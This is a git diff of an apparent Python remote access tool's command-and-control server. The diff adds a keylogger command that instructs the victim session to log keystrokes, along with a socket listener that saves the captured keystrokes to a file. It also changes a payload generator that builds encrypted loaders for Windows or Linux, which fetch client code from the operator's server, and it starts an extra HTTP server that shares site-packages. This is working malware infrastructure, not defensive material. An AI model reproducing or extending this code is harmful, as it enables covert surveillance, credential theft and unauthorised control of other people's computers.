@@ -5,7 +5,9 @@ import psutil
 import signal
 import threading, socket, colorama, helpers,session, socketserver,select, subprocess, os, time,secrets
 import random
+import logging
 import encryption
+
 
 from pyfiglet import figlet_format
 
@@ -17,10 +19,10 @@ def read_config(config_filepath):
             config_data = json.load(f)
             return config_data
     except FileNotFoundError:
-        print(f"Error: Config file not found at {config_filepath}")
+        helpers.show(f"Error: Config file not found at {config_filepath}",colour="RED")
         return None
     except json.JSONDecodeError:
-        print(f"Error: Invalid JSON format in {config_filepath}")
+        helpers.show(f"Error: Invalid JSON format in {config_filepath}",colour="RED")
         return None
 
 
@@ -38,6 +40,11 @@ class server():
         self.config = read_config("config.json")
         self.url = f"http://{self.config.get("host_ip")}:5001"
         self.key = self.generate_key()
+        self.modules = []
+        
+        for filename in os.listdir(os.path.join(os.getcwd(), 'modules')):
+            self.modules.append(filename[:-3])
+        
         self.threads = []
         #TODO: dockerfile
         #TODO: list all sessions
@@ -92,7 +99,18 @@ class server():
                 'method' : self._payload,
                 'use' : 'payload < win || linux >',
                 'desc' : 'generate a payload for windows or linux'
-            }
+            },
+            'modules': {
+                'method' : self._modules,
+                'use' : 'modules',
+                'desc' : 'show list of modules'
+            },
+            'keylogger': {
+                'method' : self._keylogger,
+                'use' : 'keylogger',
+                'desc' : 'run a keylogger on the current session'
+            },
+
 
         
         }
@@ -107,8 +125,54 @@ class server():
         else:
             raise Exception("Unknown command: \"{}\"".format(command))
         return out
+    
+    def _modules(self):
+        out = "List of Modules: | "
+        for mod in self.modules:
+            out += mod + " | "
+        return out
+    
+    @helpers.make_threaded
+    def keylog_listener(self):
+        helpers.show("LISTENING FOR KEYSTOKES ON PORT 5004 OUTPUT SAVED TO output/keylog.txt",colour="BLUE", style="BRIGHT", end="\n->")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            # Bind the socket to the host and port
+            s.bind(("127.0.0.1", 5004))
+            s.listen()
+            while True and not globals()["close"]:
+                # Listen for incoming connections
+                s.settimeout(0.1)
+                # Accept a connection
+            
+                try:
+                    conn, addr = s.accept()
+                    with conn:
+                        
+                        
+                            # Receive data from the client
+                            while True:
+                                data = conn.recv(1024)  # Receive up to 1024 bytes This is a test wooot
+                                if not data:
+                                    break  # No more data, connection closed
+                                # Process the received data (e.g., print it) 
+                                # Decode received bytes to string, then append to file
+                                decoded_data = data.decode("utf-8", errors="replace")
+                                with open("output/keylog.txt", "a", encoding="utf-8")  as output_file:
+                                    output_file.write(decoded_data)
+                except socket.timeout:
+                    pass   
+        helpers.show("STOPPING KEYLOGGING SOCKET", colour="RED", style="BRIGHT", end="\n")   
         
 
+
+    def _keylogger(self):
+        self.current_session.send_instruction("keylogger")
+        self.threads.append(self.keylog_listener())
+
+
+
+
+        
     @helpers.make_threaded
     def get_client_connection(self):
         '''wait for a client to connect on a different thread and create a new session'''
@@ -138,7 +202,7 @@ class server():
                         helpers.show("CREATED NEW SESSION WITH ID " + str(session_id), colour="BLUE", style="BRIGHT", end="\n->")
 
                         connection.sendall(self.key)
-                        print(self.key)
+                        
                     else:
                         helpers.show("CONNECTION FAILED", colour="RED", style="BRIGHT", end="\n->")
             except socket.timeout:
@@ -165,13 +229,16 @@ class server():
         if system == "linux":
             payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
             url = self.url + "/client.py"
-            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
+            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
         elif system == "win":
             payload_path = os.path.join(os.getcwd(), 'base-loader/loader.py')
             url = self.url + "/win_client.py"
-            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
+            helpers.modify_script(payload_path,os.path.join(os.getcwd(), 'payload/payload.py'),encryption.encrypt(url.encode(),self.key),self.key)
         else:
             helpers.show("GIVE VALID OPERATING SYSTEM (win or linux)", colour="RED", style="BRIGHT", end="\n")   
+
+        
+        helpers.show(f"PAYLOAD FILE WRITTEN TO PAYLOAD DIRECTORY", colour='GREEN', style='BRIGHT', end='\n->')
 
     
     def _shell(self):
@@ -317,6 +384,8 @@ if __name__ == "__main__":
     helpers.show("STARTING MODULE HOSTING", colour='BLUE', style='BRIGHT', end='\n')
     globals()['module_host'] = subprocess.Popen('python -m http.server 5001',stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=os.getcwd() + '/encrypted',shell=True)
     globals()['close'] = False
+
+    globals()['module_host'] = subprocess.Popen('python -m http.server 5003', stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd='/usr/local/lib/python3.12/site-packages',shell=True)
 
     helpers.show("STARTING COMMAND SERVER", colour='BLUE', style='BRIGHT', end='\n')
     globals()['CommandServer'].run()
